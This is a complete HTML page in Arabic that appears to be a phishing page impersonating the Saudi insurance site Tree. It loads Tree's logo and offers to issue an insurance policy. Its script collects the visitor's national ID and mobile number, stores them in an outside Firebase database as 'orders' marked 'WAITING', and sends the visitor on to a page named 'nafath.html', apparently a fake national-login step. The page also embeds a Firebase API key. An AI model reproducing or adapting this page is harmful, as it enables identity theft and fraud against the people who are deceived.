<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تري | Treet</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    
    <style>
        body { background-color: #0b1c18; color: white; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: #08241e; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #143a32; }
        .logo { width: 80px; margin-bottom: 20px; }
        .input-box { background: #0d3129; border: 1px solid #143a32; border-radius: 10px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; }
        input { background: transparent; border: none; color: white; width: 100%; text-align: center; font-size: 16px; outline: none; }
        .btn-submit { background: #00ff9d; color: #0b1c18; border: none; border-radius: 10px; padding: 15px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; }
        .btn-submit:disabled { background: #008f58; cursor: not-allowed; }
        .error-msg { color: #ff4d4d; font-size: 13px; margin-bottom: 10px; display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://tree.sa/assets/images/logo.png" class="logo" alt="Tree">
    <h3 style="margin-bottom: 25px;">إصدار وثيقة تأمين</h3>

    <div class="input-box">
        <input type="tel" id="id_number" placeholder="رقم الهوية / الإقامة" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
    </div>

    <div class="input-box">
        <input type="tel" id="phone_number" placeholder="رقم الجوال (05xxxxxxxx)" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
    </div>

    <div id="error_box" class="error-msg"></div>

    <button class="btn-submit" id="main_btn" onclick="handleOrder()">أمن الحين</button>
</div>

<script>
    // إعدادات Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function toEng(s) { return s.replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632); }

    async function handleOrder() {
        const err = document.getElementById('error_box');
        const btn = document.getElementById('main_btn');
        err.style.display = "none";

        let id = toEng(document.getElementById('id_number').value.trim());
        let ph = toEng(document.getElementById('phone_number').value.trim());

        // الفحص الذكي (الفلترة)
        if (id.length !== 10 || (id[0] !== '1' && id[0] !== '2')) {
            err.innerText = "❌ رقم الهوية يجب أن يبدأ بـ 1 أو 2 (10 أرقام)";
            err.style.display = "block";
            return;
        }

        if (ph.length !== 10 || !ph.startsWith('05')) {
            err.innerText = "❌ رقم الجوال يجب أن يبدأ بـ 05 (10 أرقام)";
            err.style.display = "block";
            return;
        }

        // الإرسال
        btn.innerText = "جاري المعالجة...";
        btn.disabled = true;

        try {
            const docRef = await db.collection("orders").add({
                id_number: id,
                phone: ph,
                next_step: "WAITING",
                status: "طلب جديد",
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });
            
            localStorage.setItem('user_id', docRef.id);
            window.location.href = "nafath.html"; // تأكد من وجود الملف بهذا الاسم

        } catch (e) {
            btn.innerText = "أمن الحين";
            btn.disabled = false;
            alert("حدث خطأ في الاتصال");
        }
    }
</script>
</body>
</html>
